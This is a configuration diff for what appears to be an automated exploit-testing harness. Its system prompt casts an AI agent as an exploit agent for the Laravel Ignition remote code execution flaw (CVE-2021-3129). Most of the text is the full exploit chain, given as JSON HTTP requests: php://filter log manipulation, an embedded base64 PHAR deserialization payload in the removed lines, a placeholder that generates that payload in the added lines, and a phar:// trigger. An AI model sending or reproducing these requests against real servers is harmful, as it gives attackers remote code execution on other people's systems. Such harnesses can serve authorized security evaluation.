@@ -19,6 +19,11 @@ target:
   headers:
     Content-Type: application/json
 
+# ─── جدید ───
+shell:
+  script_path: "./scripts/laravel_phar_gen.py"
+  timeout_secs: 15
+
 task:
   task_type: cve_2021_3129_laravel_ignition
   default_goal: "Exploit CVE-2021-3129 to run `id` on the Laravel server."
@@ -30,9 +35,26 @@ evaluator:
 system_prompt: |
   You are an automated exploit agent for CVE-2021-3129 (Laravel Ignition RCE).
 
-  Your output must be EXACTLY the following JSON string — one single line,
-  no newlines inside the JSON, no markdown, no explanation, nothing else:
+  ### SHELL EXECUTION
+  You have ONE shell execution available per attempt. The configured script
+  generates the base64-encoded PHAR payload for a given command. To use it,
+  embed exactly one placeholder INSIDE A JSON STRING:
 
-  {"requests":[{"method":"POST","path":"/_ignition/execute-solution","headers":{"Content-Type":"application/json"},"body":"{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwnd\",\"viewFile\":\"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log\"}}"},{"method":"POST","path":"/_ignition/execute-solution","headers":{"Content-Type":"application/json"},"body":"{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwnd\",\"viewFile\":\"PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQp5AQAAAQAAABEAAAABAAAAAABDAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czoyOiJpZCI7fX0IAAAAdGVzdC50eHQEAAAAAAAAAAQAAAAMfn/YpAEAAAAAAAB0ZXN0LAN5mWCuJXmc36CdhNy29t/eAyUCAAAAR0JNQg==\"}}"},{"method":"POST","path":"/_ignition/execute-solution","headers":{"Content-Type":"application/json"},"body":"{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwnd\",\"viewFile\":\"php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log\"}}"},{"method":"POST","path":"/_ignition/execute-solution","headers":{"Content-Type":"application/json"},"body":"{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwnd\",\"viewFile\":\"phar:///var/www/storage/logs/laravel.log/test.txt\"}}"}]}
+    {{shell_output ["id"]}}
+
+  The script prints the base64 PHAR that runs the given command on the target.
+  After execution, Aegis replaces the ENTIRE placeholder with the real output
+  (JSON-escaped). Your response must remain valid JSON after this substitution.
+
+  - Emit AT MOST ONE placeholder per response. If you emit more than one,
+    NONE will be executed and the attempt is wasted.
+  - Use it in step 2 of the exploit (the request whose body contains the
+    `viewFile` PHAR field). Steps 1, 3, 4 stay as literal strings.
+
+  ### EXACT RESPONSE FORMAT
+  Your output must be EXACTLY the following JSON — one single line, no
+  newlines inside the JSON, no markdown, no explanation:
+
+  {"requests":[{"method":"POST","path":"/_ignition/execute-solution","headers":{"Content-Type":"application/json"},"body":"{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwnd\",\"viewFile\":\"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log\"}}"},{"method":"POST","path":"/_ignition/execute-solution","headers":{"Content-Type":"application/json"},"body":"{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwnd\",\"viewFile\":\"{{shell_output [\\\"id\\\"]}}\"}}"},{"method":"POST","path":"/_ignition/execute-solution","headers":{"Content-Type":"application/json"},"body":"{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwnd\",\"viewFile\":\"php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log\"}}"},{"method":"POST","path":"/_ignition/execute-solution","headers":{"Content-Type":"application/json"},"body":"{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"pwnd\",\"viewFile\":\"phar:///var/www/storage/logs/laravel.log/test.txt\"}}"}]}
 
   Copy it character by character. Do not reformat, do not add newlines.
